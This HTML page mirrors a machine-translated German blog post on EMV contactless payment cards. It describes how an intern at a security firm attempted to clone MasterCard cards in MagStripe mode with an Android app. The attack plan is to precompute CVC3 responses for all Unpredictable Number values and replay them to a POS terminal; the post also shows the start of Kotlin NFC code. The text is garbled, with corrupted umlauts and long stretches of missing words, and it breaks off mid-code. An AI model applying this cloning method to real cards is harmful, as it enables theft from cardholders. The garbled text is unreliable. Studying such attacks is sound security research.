<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üôÜ üòü ü§ö Klonen Sie eine kontaktlose Karte mit einer mobilen Anwendung ü§ôüèæ üë©‚Äç‚ù§Ô∏è‚Äçüë© ‚ò¢Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Es war immer interessant zu sehen, was auf einer Bankkarte unter der ‚ÄûHaube‚Äú passiert. Wie das Kommunikationsprotokoll einer Bankkarte und eines POS-T...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Klonen Sie eine kontaktlose Karte mit einer mobilen Anwendung</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/421543/">  Es war immer interessant zu sehen, was auf einer Bankkarte unter der ‚ÄûHaube‚Äú passiert.  Wie das Kommunikationsprotokoll einer Bankkarte und eines POS-Terminals implementiert ist, wie es funktioniert und wie sicher es ist.  Eine solche Gelegenheit bot sich mir, als ich ein Praktikum bei Digital Security absolvierte.  Beim Parsen einer bekannten Sicherheitsanf√§lligkeit von EMV-Karten im MagStripe-Modus wurde daher beschlossen, eine mobile Anwendung zu implementieren, die √ºber eine kontaktlose Schnittstelle mit dem Terminal kommunizieren kann, wobei eigene Befehle und eine detaillierte Analyse von Anforderungen und Antworten verwendet werden.  Versuchen Sie auch, die Methode zum Klonen von MasterCard-Karten im MagStripe-Modus zu implementieren. <br><br>  In diesem Artikel werde ich versuchen zu beschreiben, was eine EMV-Karte ist, wie sie funktioniert und wie Sie mit Android versuchen k√∂nnen, Ihre MasterCard-Karte zu klonen. <br><br>  <i><b>"Es gibt einige Dinge, die man mit Geld nicht kaufen kann.</b></i>  <i><b>F√ºr alles andere gibt es MasterCard ¬ª</b></i> <br><br><h3>  Was ist eine EMV-Karte? </h3><br>  EMV ist der internationale Standard f√ºr Bankkarten mit Chip.  <b>E</b> uropay + <b>M</b> asterCard + <b>V</b> ISA war an der Entwicklung dieses Standards beteiligt, daher der Name.  Versuchen wir herauszufinden, wie die Karte √ºber eine kontaktlose Schnittstelle mit dem POS-Terminal kommuniziert. <br><a name="habracut"></a><br>  Beginnen wir mit den Grundlagen. <br><br>  Eine physische kontaktlose EMV-Karte funktioniert fast genauso wie ein RFID-Tag.  Wenn es einfach ist, tritt der Chip in das elektromagnetische Feld ein und in einem geschlossenen leitenden Stromkreis (in unserem Fall ist es eine Antenne, die sich um den Umfang befindet), der in einem magnetischen Wechselfeld angeordnet ist, wird ein elektrischer Wechslerstrom erzeugt.  Dieser Strom l√§dt einen speziellen Kondensator auf, der parallel zum Resonanzkreis der Karte geschaltet ist.  Die im Kondensator gespeicherte Energie wird verwendet, um eine Mikroschaltungskarte f√ºr verschiedene Operationen durchzuf√ºhren.  Wenn der Leser das elektromagnetische Feld √§ndert, werden die √Ñnderungen sofort auf dem Chip wahrgenommen.  Mit Hilfe der Signalmodulation k√∂nnen wir Informationen in bin√§rer Form √ºbertragen.  Wenn Sie den Lastwiderstand an der Karte anschlie√üen und / oder die Kapazit√§t des Kondensators √§ndern, k√∂nnen Sie den Strom im Stromkreis der Karte √§ndern, was zu einer √Ñnderung des von ihr im Bereich der Leseschaltung erzeugten elektromagnetischen Feldes f√ºhrt, sodass die Karte Daten √ºbertr√§gt.  Der Leser muss diese √Ñnderungen erkennen.  Diese physikalische Interaktion wird durch die Norm ISO / IEC 14443 <i>‚ÄûIdentifikationskarten - Kontaktlose Karten f√ºr integrierte Schaltkreise - N√§herungskarten‚Äú</i> geregelt. <br><br>  Der Kartenchip selbst ist eine Smartcard, auf der JavaCard ausgef√ºhrt wird, eine separate Version von Java f√ºr Plattformen mit geringen Rechenressourcen und Unterst√ºtzung f√ºr kryptografische Algorithmen.  JavaCard l√§dt Applets herunter, bei denen es sich um Anwendungen handelt.  Es gibt auch eine GlobalPlatform, ein bestimmter Standard f√ºr JavaCard, der die M√∂glichkeit bietet, Daten auf der Karte sicher zu verwalten und Anwendungen auf der Karte herunterzuladen, zu √§ndern und zu l√∂schen.  In diesem Artikel werden die Sicherheitsmechanismen der Smartcard selbst nicht ber√ºcksichtigt.  Es reicht zu wissen, dass sich die gesch√ºtzten Daten, z. B. der private Schl√ºssel und der geheime Hauptschl√ºssel der Karte, an einem sicheren Ort befinden und nicht mit Standardmitteln entfernt werden k√∂nnen. <br><br>  Ich erinnere Sie auch an eine kleine Terminologie f√ºr diejenigen, die nicht vertraut sind. <br><br>  <b>POS-Terminal</b> (Point of Sale) - ein Ger√§t des Verk√§ufers, das eine Karte liest und eine Zahlung einleitet.  Weiterhin nennen wir dieses Ger√§t einfach ein Terminal. <br>  <b>Die ausstellende Bank</b> ist die Bank, die Ihre Karte ausgestellt hat. <br>  <b>Acquirer Bank</b> - eine Bank, die Verk√§ufern POS-Terminals ausstellt und Zahlungen von diesen verarbeitet. <br>  <b>Das Zahlungssystem</b> ist das zentrale Bindeglied zwischen der Acquirer Bank und der ausstellenden Bank. Es werden absolut alle Zahlungen ausgef√ºhrt, und es wei√ü, welche Bank wie viel Geld √ºberweisen soll.  Es gibt viele Zahlungssysteme auf der Welt, neben dem bekannten <b>Visa</b> und <b>MasterCard</b> gibt es auch <b>American Express</b> , <b>China UnionPay</b> und das russische Zahlungssystem <b>MIR</b> . <br><br>  Nun, die Karte und der Leser k√∂nnen kommunizieren.  Sie senden sich gegenseitig APDU-Befehle in Form von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Tag-Length-Value,</a> d.h.  Der Name des Tags wird hexadezimal √ºbertragen, seine L√§nge und sein Wert selbst.  Alle Befehle sind nat√ºrlich in der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Dokumentation beschrieben</a> und sehen ungef√§hr so ‚Äã‚Äãaus: <br><br><img src="https://habrastorage.org/webt/kn/ne/tj/knnetjhcx4h0rd7xijgzyv5goye.png" alt="Bild"><br><br>  Die Standard-EMV-Transaktion erfolgt in mehreren Schritten. Ich werde den vollst√§ndigen Interaktionsalgorithmus im Fall einer Kontaktschnittstelle beschreiben. Bei einer kontaktlosen Schnittstelle ist der Algorithmus etwas verk√ºrzt: <br><br><ul><li>  Anwendungsauswahl; </li><li>  Initialisierung der Antragsbearbeitung; </li><li>  Anwendungsdaten lesen </li><li>  Offline-Authentifizierung </li><li>  Verarbeitungsbeschr√§nkungen; </li><li>  Karteninhaberscheck; </li><li>  Risikomanagement auf der Seite des Terminals; </li><li>  Analyse von Terminalaktionen; </li><li>  Risikomanagement auf der Kartenseite; </li><li>  Analyse der Aktionen der Karte; </li><li>  Online-Verarbeitung; </li><li>  Der Abschluss der Operation. </li></ul><br><img src="https://habrastorage.org/webt/0y/sc/rd/0yscrdsiso65ccn0arqjwxc4joe.png" alt="Bild"><br><br>  Wir betrachten kurz jede Operation. <br><br>  Anwendungsauswahl.  Es kommt h√§ufig vor, dass eine Karte mehrere Anwendungen enth√§lt.  Zum Beispiel eine Bankkarte und ein Reiseticket.  Und das Terminal muss irgendwie herausfinden, wo und welcher Algorithmus verwendet werden soll.  Mit der sogenannten <b>Application Identifier (AID</b> ) wird eine Anwendung ausgew√§hlt.  Um dies zu verstehen, sendet das Terminal einen <b>SELECT-</b> Befehl.  Die <b>AID</b> der Visa Classic-Karte sieht beispielsweise folgenderma√üen aus: <b>A0000000031010</b> .  Wenn mehrere solcher Codes als Antwort eingehen und das Terminal mit mehreren Anwendungen arbeiten kann, zeigt das Terminal eine Liste an und bietet an, die von uns ben√∂tigte Anwendung auszuw√§hlen.  Wenn das Terminal keinen der Anwendungscodes unterst√ºtzt, wird der Vorgang vom Terminal abgelehnt. <br><br>  Initialisierung der Antragsbearbeitung.  Hier wird zun√§chst der geografische Standort √ºberpr√ºft.  Zum Beispiel k√∂nnen Maestro Momentum-Karten nur in Russland bezahlt werden.  Diese Phase wird durchgef√ºhrt, um den Emittenten die M√∂glichkeit zu geben, vorhandene Online-Risikomanagementmethoden bei der Durchf√ºhrung von Offline-Operationen anzuwenden.  Zu diesem Zeitpunkt kann eine EMV-Transaktion auf Initiative der Karte selbst storniert werden, wenn diese Art von Transaktion vom Emittenten in einem bestimmten Land der Welt verboten ist.  Ferner √ºbertr√§gt die Karte einen Satz speziell strukturierter Informationen an das Terminal, die eine Beschreibung der Funktionalit√§t der Karte und der Anwendung enthalten. <br><br>  Anwendungsdaten lesen.  Verschiedene f√ºr die Transaktion erforderliche Kartendaten werden an das Terminal √ºbertragen, beispielsweise Kartennummer, Ablaufdatum, Transaktionsz√§hler und viele andere Daten.  Einige davon werden sp√§ter besprochen. <br><br>  Beispieldaten: <br><br><img src="https://habrastorage.org/webt/qq/af/8u/qqaf8ualsk94r5lgoqqz9gupznc.png" alt="Bild"><br><br>  Eine Bescheinigung √ºber den √∂ffentlichen Schl√ºssel der ausstellenden Bank und die Karte selbst wird ebenfalls √ºbermittelt.  Damit das Terminal die digitale Signatur einiger Kartendaten √ºberpr√ºfen kann, wird die <b>PKI-Infrastruktur</b> (Public Key Infrastructure) verwendet.  Kurz gesagt, das Zahlungssystem verf√ºgt √ºber zwei Schl√ºssel - √∂ffentlich und privat, und das Zahlungssystem gilt f√ºr alle Teilnehmer der <b>CA (Center Authority)</b> .  Tats√§chlich stellt das Zahlungssystem f√ºr jede Bank des Emittenten ein neues Schl√ºsselpaar aus und generiert gleichzeitig ein Zertifikat des √∂ffentlichen Schl√ºssels der Bank des Emittenten, das mit dem privaten Schl√ºssel CA signiert wird.  Wenn die Bank eine neue Karte ausstellt, generiert sie dementsprechend ein Schl√ºsselpaar f√ºr die Karte und ein Zertifikat √ºber den √∂ffentlichen Schl√ºssel der Karte, das mit dem privaten Schl√ºssel der Bank signiert wird.  In Terminals wird normalerweise ein Zertifikat mit √∂ffentlichem Schl√ºssel f√ºr verschiedene Zahlungssysteme verkabelt.  Wenn die Karte das Zertifikat des √∂ffentlichen Schl√ºssels der Bank des Ausstellers und das Zertifikat der Karte selbst √ºbertr√§gt, kann das Terminal die gesamte Kette mithilfe des √∂ffentlichen Schl√ºssels des Zahlungssystems problemlos √ºberpr√ºfen.  Das Terminal √ºberpr√ºft mithilfe des √∂ffentlichen Schl√ºssels des Zahlungssystems zun√§chst die Echtheit des Bankzertifikats des Ausstellers. Wenn es echt ist, kann es als vertrauensw√ºrdig eingestuft werden. Mit dem Bankzertifikat des Ausstellers k√∂nnen Sie nun das Zertifikat der Karte selbst √ºberpr√ºfen.  Weitere Details finden Sie im Artikel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">zur EMV-Sicherheit</a> . <br><br>  Offline-Authentifizierung.  Das Terminal bestimmt den Typ der unterst√ºtzten Offline-Authentifizierungsmethode.  Es gibt statische ( <b>statische Datenauthentifizierung - SDA</b> ), dynamische ( <b>dynamische Datenauthentifizierung - DDA</b> ) und kombinierte ( <b>kombinierte Datenauthentifizierung - CDA</b> ).  Diese Methoden basieren ebenfalls auf PKI.  <b>SDA</b> besteht nur aus signierten Daten auf dem privaten Schl√ºssel der Bank des Ausstellers, <b>DDA</b> - das Terminal sendet eine Zufallszahl und die Karte muss diese mit ihrem privaten Schl√ºssel signieren. Das Terminal √ºberpr√ºft diese Signatur anhand des zuvor empfangenen Kartenzertifikats, sodass das Terminal dies sicherstellt Die Karte hat wirklich einen privaten Schl√ºssel - daher ist sie echt.  <b>CDA</b> ist nur eine Kombination aus beiden. <br><br>  Handhabungsbeschr√§nkungen.  Hier pr√ºft das Terminal die zuvor von der Karte empfangenen Daten auf die Eignung f√ºr diesen Vorgang.  Beispielsweise werden die Start- / <b>Enddaten des Ablaufdatums</b> der Anwendung <b>(Tag '5F24')</b> und des Datums des <b>Inkrafttretens der</b> <b>Anwendung (Tag '5F25') √ºberpr√ºft</b> .  Au√üerdem wird die Version der Anwendung √ºberpr√ºft.  Die Ergebnisse der in dieser Phase durchgef√ºhrten Operationen werden ebenfalls im <b>TVR-</b> Bericht <b>(Terminalverifizierungsergebnisse)</b> aufgezeichnet.  Basierend auf den Ergebnissen dieser Phase kann die Transaktion nicht abgebrochen werden, selbst wenn beispielsweise die Anwendung abgelaufen ist. <br><br>  Karteninhaber √ºberpr√ºfen.  Die √úberpr√ºfung des Karteninhabers wird durchgef√ºhrt, um die Person zu authentifizieren, die die Karte bereitgestellt hat, und um zu √ºberpr√ºfen, ob sie der wahre Eigent√ºmer der Karte ist.  Der EMV-Standard bietet verschiedene <b>Methoden zur √úberpr√ºfung von Karteninhabern</b> .  √úberpr√ºfungsmethoden werden sowohl auf dem Terminal als auch auf der Karte definiert.  Sie sind in den sogenannten <b>CVM-Listen enthalten</b> .  W√§hrend der Ausf√ºhrung vergleichen das Terminal und die Karte die empfangenen CVM-Listen und w√§hlen die allgemeine √úberpr√ºfungsmethode aus. <br><br>  Liste der unterst√ºtzten √úberpr√ºfungsmethoden: <br><br><ul><li>  Kein CVM erforderlich ('011111'b); </li><li>  CVM-Verarbeitung fehlgeschlagen ('000000'b); </li><li>  Unterschrift ('011110'b); </li><li>  Online verschl√ºsselte verschl√ºsselte PIN ('000010'b); </li><li>  √úberpr√ºfung der Klartext-PIN durch ICC ('000001'b); </li><li>  √úberpr√ºfung der PIN im Klartext durch ICC und Signatur ('000011'b); </li><li>  Verschl√ºsselte PIN-√úberpr√ºfung durch ICC ('000100'b); </li><li>  Verschl√ºsselte PIN-√úberpr√ºfung durch ICC und Signatur ('000101'b). </li></ul><br>  Hier <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">gibt es</a> auch interessante Informationen zu diesem Thema. <br><br>  Risikomanagement auf der Seite des Terminals.  In dieser Phase f√ºhrt das Terminal eine interne √úberpr√ºfung der Transaktionsparameter auf der Grundlage der Risikomanagementeinstellungen der √ºbernehmenden Bank durch.  Risikomanagementverfahren k√∂nnen vom Terminal jederzeit zwischen dem Abschluss des Lesevorgangs der Kartendaten und der Bildung des ersten <b>GENERATE AC-</b> Befehls durch das Terminal durchgef√ºhrt werden.  Das Risikomanagement auf der Terminalseite umfasst drei Mechanismen: <br><br><ul><li>  Kontrolle der Gr√∂√üe der auf der Karte ausgef√ºhrten Vorg√§nge ( <b>√úberpr√ºfung der Bodenbegrenzung</b> ); </li><li>  zuf√§llige Transaktionsauswahl f√ºr die Online-Autorisierung dieser Transaktion durch den Emittenten ( <b>zuf√§llige Transaktionsauswahl</b> ); </li><li>  √úberpr√ºfung der Offline-Aktivit√§t bei Verwendung der Karte ( <b>Velocity Checking</b> ). </li></ul><br>  Analyse von Terminalaktionen.  In dieser Phase analysiert das Terminal die Ergebnisse der vorherigen Schritte der Transaktion.  Basierend auf den Ergebnissen der Analyse entscheidet das Terminal, ob die Operation online durchgef√ºhrt, offline ausgef√ºhrt oder die Operation abgelehnt werden soll. <br><br>  Risikomanagement auf der Kartenseite.  Die Karte, die vom <b>GENERATE AC</b> Befehlsdaten √ºber die Transaktion, das Terminal und die Ergebnisse der Terminalpr√ºfungen erhalten hat, f√ºhrt ihrerseits ihre eigenen Risikomanagementverfahren durch und trifft ihre eigene Entscheidung dar√ºber, wie der Vorgang abgeschlossen werden soll. <br><br>  Analyse der Aktionen der Karte.  In dieser Phase schlie√üt die Karte die Risikomanagementverfahren ab und generiert ein Antwortkryptogramm f√ºr das Terminal.  Wenn die Karte die Transaktion genehmigt, wird ein <b>Transaktionszertifikat</b> generiert.  Wenn die Karte beschlie√üt, den Vorgang in Echtzeit auszuf√ºhren, generiert sie ein <b>ARQC (Authorization Request Cryptogram)</b> .  Wenn die Karte alternative Autorisierungsmethoden verwendet, wird die <b>√úberweisung</b> zur <b>Anwendungsautorisierung verwendet</b> .  Falls die Karte die Transaktion ablehnt, klicken Sie auf <b>Anwendungsauthentifizierungs-Kryptogramm</b> . <br><br>  Ein weiteres <b>ARPC-Kryptogramm (Authorization Response Cryptogram)</b> wird zur Authentifizierung des Ausstellers ben√∂tigt.  Der Aussteller generiert ein Kryptogramm-ARPC und sendet das Kryptogramm an die Karte. Wenn die Karte das Kryptogramm best√§tigt, wird der Aussteller von der Karte authentifiziert. <br><br>  Ein wenig √ºber die Sicherheit von Schl√ºsseln und die gegenseitige Authentifizierung der Karte und des Ausstellers aus dem Buch von I. M. Goldovsky: <blockquote>  Die gegenseitige Authentifizierung bedeutet, dass sich die Karte und das Terminal gegenseitig mithilfe der Authentifizierung von ARQC- und ARPC-Kryptogrammen authentifizieren.  Kryptogramme sind Daten, die unter Verwendung eines geheimen Schl√ºssels (der der Karte und der Bank dem Aussteller bekannt ist), der Transaktionsnummer, einer vom Terminal generierten Zufallszahl sowie einiger Details der Transaktion, des Terminals und der Karte generiert werden.  Im Fall von ARPC wird der Autorisierungsantwortcode des Ausstellers ebenfalls zu den aufgelisteten Daten hinzugef√ºgt.  Ohne Kenntnis des geheimen Schl√ºssels der Karte zur Erstellung eines Kryptogramms ist es unm√∂glich, ARQC / ARPC-Werte auf absehbare Zeit mit dem aktuellen Stand der Technik zu berechnen, und daher zeigt die Tatsache ihrer erfolgreichen √úberpr√ºfung die Authentizit√§t der Karte und des Ausstellers an.  Die Online-Authentifizierung ist die zuverl√§ssigste Methode zur Authentifizierung einer Karte.  Dies liegt daran, dass es direkt vom Emittenten ohne Vermittler in Form eines Terminals durchgef√ºhrt wird.  Zus√§tzlich wird ein 3DES-Algorithmus mit einem tempor√§ren 112-Bit-Schl√ºssel f√ºr die Online-Authentifizierung verwendet, dessen kryptografische St√§rke der kryptografischen St√§rke des RSA-Algorithmus entspricht, wobei die L√§nge des asymmetrischen Schl√ºsselmoduls f√ºr die Offline-Authentifizierung der Kartenanwendung 1700 Bit √ºberschreitet.  Die Verwendung von asymmetrischen Schl√ºsseln dieser L√§nge auf der Karte ist immer noch recht selten.  Normalerweise werden Schl√ºssel mit einer Modull√§nge von 1024, 1152 oder 1408 Bit verwendet. </blockquote><br><br>  Letztendlich durchl√§uft eine Online-Transaktion eine Kette: <br>  <b>Karte &lt;--&gt; POS-Terminal &lt;--&gt; Bank Acquire &lt;--&gt; Zahlungssystem &lt;--&gt; Bankaussteller.</b> <br><br><img src="https://habrastorage.org/webt/lg/od/lo/lgodlo0oz2jbpxbje3o15q9ikgs.jpeg" alt="Bild"><br><br><h3>  Klonen Sie die MasterCard im MagStripe-Modus </h3><br>  Wir gehen direkt zum Prinzip des Klonens √ºber.  Diese kontaktlose Kartenangriffsmethode wurde von zwei Forschern, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Michael Roland, Josef Langer</a> von der Universit√§t √ñsterreich, ver√∂ffentlicht.  Es basiert auf einem allgemeinen Prinzip namens <i>Skimming</i> .  Dies ist ein solches Szenario, in dem ein Angreifer Geld von einer Bankkarte stiehlt, indem er Informationen von dieser Karte liest (kopiert).  Im Allgemeinen ist es wichtig, die PIN geheim zu halten und nicht zu verlieren.  Aber in der Methode der √ñsterreicher m√ºssen wir das nicht wissen.  Das Klonen einer Zahlungskarte ist f√ºr die Kernel-Version der EMV Contactless Kernel 2-Anwendung erfolgreich. Die Version dieses Protokolls unterst√ºtzt zwei Betriebsmodi f√ºr kontaktlose Karten: EMV-Protokoll <b>(MasterCard PayPass M / Chip)</b> und <b>MagStripe (MasterCard PayPass MagStripe)</b> . <br><br>  <b>MagStripe</b> ist ein Magnetstreifenkarten-Unterst√ºtzungsmodus.  Dieser Modus ist auf MasterCard-Karten mit kontaktloser Schnittstelle implementiert.  Der MagStripe-Modus wird h√∂chstwahrscheinlich f√ºr Banken ben√∂tigt, die Schwierigkeiten haben, die gesamte Infrastruktur zu √ºbertragen, um kontaktlose EMV-Transaktionen mit Chips zu unterst√ºtzen.  Visa-Karten haben √ºbrigens auch eine √§hnliche Funktionsweise - <b>PayWave MSD (Magnetic Stripe Data)</b> . <br><br>  Der Transaktionsverarbeitungsprozess f√ºr kontaktlose Karten ist im Vergleich zu Chipkarten abgeschnitten und funktioniert normalerweise im folgenden Modus: <br><br><ol><li>  Das Terminal sendet einen <b>SELECT PPSE-Befehl</b> (Proximity Payment System Environment).  Die Karte sendet eine Liste der unterst√ºtzten Anwendungen. </li><li>  Das Terminal sendet einen <b>SELECT-</b> Befehl.  Als Antwort erh√§lt er die erforderlichen Bewerbungsdetails. </li><li>  Das Terminal sendet den Befehl <b>GET_PROCESSING_OPTIONS</b> .  Die Karte antwortet, welche Art von Authentifizierung sie unterst√ºtzt und ob dort eine √úberpr√ºfung des Karteninhabers vorliegt. </li><li>  Das Terminal sendet den Befehl <b>READ_RECORDS</b> .  Die Antwortkarte sendet Track1 und Track2 fast genauso wie die auf dem Magnetstreifen der Karte aufgezeichneten. </li><li>  Das Terminal sendet den Befehl <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .  Dies bedeutet, dass die Karte einen CVC3-Wert basierend auf der √ºbergebenen unvorhersehbaren Nummer generieren sollte. </li></ol><br><img src="https://habrastorage.org/webt/yx/4k/go/yx4kgocqjxhraaeqz1c4qr4ukpe.jpeg" alt="Bild"><br><br><div class="spoiler">  <b class="spoiler_title">Wie sieht das alles im wirklichen Leben aus?</b> <div class="spoiler_text">  Es sieht aus wie ein <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">APDU-</a> Team.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Liste aller Tags</a> . <br><br>  APDU - Application Protocol Data Unit ist ein Symbol eines Frames mit einem Kartenbefehl oder einer Kartenantwort. <br><br>  Zu diesem Thema gibt es <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> einige Artikel. <br></div></div><br>  Die Karte unterst√ºtzt den speziellen Befehl COMPUTE CRYPTOGRAPHIC CHECKSUM, dessen Argument die im UDOL (Unpredictable Number Data Object) definierten Daten sind.  <b>Infolgedessen berechnet die Karte unter Verwendung des 3DES-Algorithmus und des geheimen Schl√ºssels den dynamischen Wert CVC3 (Card Verification Code).</b>  Als Argument f√ºr die 3DES-Funktion werden die Verkettung der UDOL-Daten und des Transaktionsz√§hlers (Application Transaction Counter, ATC) verwendet.  <b>Daher h√§ngt der Wert von CVC3 immer von den UN- und ATC-Objekten ab.</b> <br><br>  Mit anderen Worten, dieser Befehl wird ben√∂tigt, damit die Karte eine bestimmte ‚ÄûSignatur‚Äú generiert, damit der Aussteller die Karte √ºberpr√ºfen kann.  Die Signatur der Transaktion selbst fehlt jedoch in dieser Signatur.  Die Signatur enth√§lt <b>ATC-</b> Werte <b>- 2 Bytes</b> , <b>CVC3 (Track1) - 2 Bytes</b> , <b>CVC3 (Track2) - 2 Bytes</b> , die von der Karte basierend auf dem geheimen Schl√ºssel generiert werden, den auch die ausstellende Bank und der Transaktionsz√§hler (ATC) kennen.  Gleichzeitig informiert das POS-Terminal zum Generieren der Signatur die <b>UN-</b> Karte <b>(Unpredictable Number)</b> - 4 Byte, die auch bei der Generierung der Signatur verwendet wird.  Die unvorhersehbare Nummer verhindert die Generierung von Authentifizierungscodes auf einer realen Karte f√ºr die sp√§tere Verwendung bei betr√ºgerischen Transaktionen.  Bei Angriffen st√∂rt uns die UN stark, da es nicht m√∂glich ist, 4 Bytes aufzulisten, ohne die Grenzen des Transaktionsz√§hlers zu √ºberschreiten.  Es gibt jedoch einige Schwachstellen in der Spezifikation. <br><br>  Erstens beschr√§nkt die Spezifikation UN auf die Codierung von Zahlen, n√§mlich den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Binary Decimal Code (BCD)</a> , was im Wesentlichen bedeutet, dass bei Betrachtung einer solchen codierten Zahl in HEX nur Zahlen von 0 bis 9 angezeigt werden und alle anderen Werte ber√ºcksichtigt werden als ob verboten.  Somit verringert sich die Menge an UN von 4.294.967.295 auf 99.999.999. <br><br>  Zweitens wird die Anzahl der signifikanten UN-Ziffern durch die Karte bestimmt.  Abh√§ngig von den speziellen Parametern in den Spuren kann die Anzahl der Ziffern in der UNO je nach Kartentyp zwischen 10 und 10.000 liegen. In der Praxis werden am h√§ufigsten 1000 Werte gefunden. <br><br>  <b>Der Angriffsplan lautet also wie folgt:</b> <br><br><ol><li>  Wir lesen die Karte und finden die Anzahl der signifikanten Stellen von UN heraus, die das Terminal bereitstellen wird </li><li>  Wir sortieren alle UNs, erhalten alle m√∂glichen Werte der Funktion <b>COMPUTE_CRYPTOGRAHIC_CHECKSUM</b> und speichern sie in der entsprechenden Tabelle mit der Zuordnung UN -&gt; Ergebnis </li><li>  Wir bringen es zum POS-Terminal und finden die Nummer heraus, nach der das POS-Terminal fragt. </li><li>  Wir w√§hlen das gew√ºnschte Ergebnis aus der Tabelle aus und ersetzen es als Antwort auf das Terminal. </li><li>  Die Transaktion wird beendet. </li><li>  GEWINN.  Der Erfolg der Genehmigung der Transaktion ist jedoch nicht garantiert, da die ausstellende Bank eine solche Transaktion ablehnen kann. </li></ol><br><img src="https://habrastorage.org/webt/5q/iw/uh/5qiwuhgbebcdx_0bdzdbrvwmcd0.jpeg" alt="Bild"><br><br>  Es ist auch erw√§hnenswert, dass der Transaktionsz√§hler (ATC) die Wiederverwendung zuvor verwendeter Authentifizierungscodes verhindert. Wenn wir diesen Angriff verwenden, m√ºssen wir die Karte erneut kopieren, da der Transaktionsz√§hler bereits zum Abrufen von Informationen verwendet wurde und in der Signatur verwendet wurde Wenn wir einen Transaktionsz√§hler von 1000 hatten und nachdem wir die Transaktion an die Bank gesendet haben, akzeptiert die Bank keine Transaktionen mehr mit einem Z√§hler unter &lt;1001.  ,    2 ,  ,       65   ,       . <br><br>           . ,  <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .    CVC3 ,       <b>SELECT</b> ,  <b>GET_PROCESSING_OPTIONS</b> ,    <b>COMPUTE_CRYPTOGRACHIC_CHECKSUM</b>     .       CVC3.         , <b> 1000   Google Galaxy Nexus S    .</b> <br><br>         <b>Terminal Simulator</b>  MasterCard.      NFC-    .      .        POS-           .         ,    . <br><br><img src="https://habrastorage.org/webt/if/cw/ka/ifcwkapz8euoz-fdb9hnmbedigq.png" alt="Bild"><br><br>     NFC  <b>ACR122</b> . <br><br><img src="https://habrastorage.org/webt/kx/75/q8/kx75q8xlkxsg3q3hodn9h1yze2o.jpeg" alt="Bild"><br><br>        .      Kotlin  Android.      . <br><br><pre><code class="plaintext hljs">data class Command( var CLA: String = 0x00.toString(), var INS: String = 0x00.toString(), var P1: String = "", var P2: String = "", var Lc: String = "", var Nc: String = "", var Le: String = "", var Nr: String = "", var SW1WS2: String = "" ) { fun split(): ByteArray { return getHexString().hexToByteArray() } fun getHexString() = CLA.plus(INS).plus(P1).plus(P2).plus(Lc).plus(Nc).plus(Le).plus(Nr).plus(SW1WS2) }</code> </pre> <br>  Zuerst m√ºssen wir die Arbeit mit NFC einrichten.  Am Telefon k√∂nnen wir in zwei Modi arbeiten.  Im Kartenmodus reagieren wir auf Befehle vom Terminal und im Terminalmodus, wenn wir Befehle senden und beispielsweise eine Karte lesen.  Das hei√üt,  Zuerst k√∂nnen wir die Karte klonen und dann sicherstellen, dass wir auf Anfragen vom Terminal mit bereits vorbereiteten Befehlen antworten. <br><br>  Das Folgende ist eine vereinfachte Implementierung der Interaktion mit NFC: <br><br><pre> <code class="plaintext hljs"> private var nfcAdapter: NfcAdapter? = null /*!&lt; represents the local NFC adapter */ private var tag: Tag? = null /*!&lt; represents 